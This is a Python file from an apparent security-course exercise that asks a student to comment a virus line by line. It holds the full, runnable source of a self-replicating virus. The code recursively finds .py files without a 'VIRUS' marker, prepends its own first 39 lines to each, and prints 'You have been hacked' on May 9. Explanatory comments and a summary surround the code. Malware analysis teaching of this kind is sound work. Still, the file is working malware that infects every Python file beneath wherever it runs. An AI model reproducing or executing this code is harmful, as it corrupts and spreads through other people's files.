#!/usr/bin/env python3
# Script: Ops301d6 Challenge-13
# Author: Lamin Touray
# Purpose:Perform an analysis of the Python-based code.
# Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# Insert comments above the final three lines explaining how the functions are called and what this script appears to do.




import os  # Import the os module for interacting with the file system
import datetime  # Import the datetime module for working with dates and times

SIGNATURE = "VIRUS"  # Define a signature string that will be used to identify infected files

# This function recursively locates all non-infected .py files in the given path and its subdirectories
def locate(path):
    files_targeted = []  # Initialize an empty list to store the paths of non-infected target files
    filelist = os.listdir(path)  # List all files and directories in the current path
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):  # Check if the current item is a directory
            files_targeted.extend(locate(path+"/"+fname))  # Recursively search inside the directory
        elif fname[-3:] == ".py":  # Check if the current item is a Python (.py) file
            infected = False
            for line in open(path+"/"+fname):  # Read the file line by line
                if SIGNATURE in line:  # Check if the signature string is in the current line
                    infected = True
                    break
            if infected == False:  # If the file is not infected
                files_targeted.append(path+"/"+fname)  # Add the file path to the list of target files
    return files_targeted

# This function infects the target Python files by prepending the virus code to the file contents
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open the current virus file
    virusstring = ""  # Initialize an empty string to store the virus code
    for i, line in enumerate(virus):
        if 0 <= i < 39:  # Copy the first 39 lines of the virus file (assumes the virus code is 39 lines long)
            virusstring += line
    virus.close()  # Close the virus file
    for fname in files_targeted:
        f = open(fname)  # Open the target file
        temp = f.read()  # Read the entire content of the target file
        f.close()
        f = open(fname, "w")  # Open the target file for writing
        f.write(virusstring + temp)  # Write the virus code followed by the original content of the target file
        f.close()

# This function detonates the payload of the virus, which is displaying a message on a specific date
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:  # Check if the current date is May 9th
        print("You have been hacked")  # Display a message

files_targeted = locate(os.path.abspath(""))  # Call the locate function to find non-infected .py files in the current directory and its subdirectories
infect(files_targeted)  # Call the infect function to infect the located target files with the virus code
detonate()  # Call the detonate function to execute the payload if the conditions are met (i.e., the current date is May 9th)


#This script is a simple Python-based virus that targets Python (.py) files in the current directory and its subdirectories. The virus has three main functions: locate(), infect(), and detonate().

# locate(): This function recursively searches for non-infected Python files in the specified directory and its subdirectories. A file is considered non-infected if it does not contain the signature string "VIRUS". The function returns a list of file paths for non-infected Python files.
# infect(): This function takes a list of target Python files (generated by locate()) and prepends the virus code to each of them. The virus code is the first 39 lines of the script itself. As a result, each infected file will contain the virus code at the beginning, effectively spreading the virus to other Python files.

# detonate(): This function serves as the payload of the virus. In this case, the payload is quite simple: if the current date is May 9th, it prints the message "You have been hacked" to the console.
# After defining these functions, the script calls them in the following order:

#locate(): It searches for non-infected Python files in the current directory and its subdirectories.
#infect(): It infects the located target files with the virus code.
#detonate(): It executes the payload if the conditions are met (i.e., the current date is May 9th).
#In summary, this script is a rudimentary example of a self-replicating Python virus that infects other Python files and has a simple payload that activates on a specific date.


# Source: chatGPT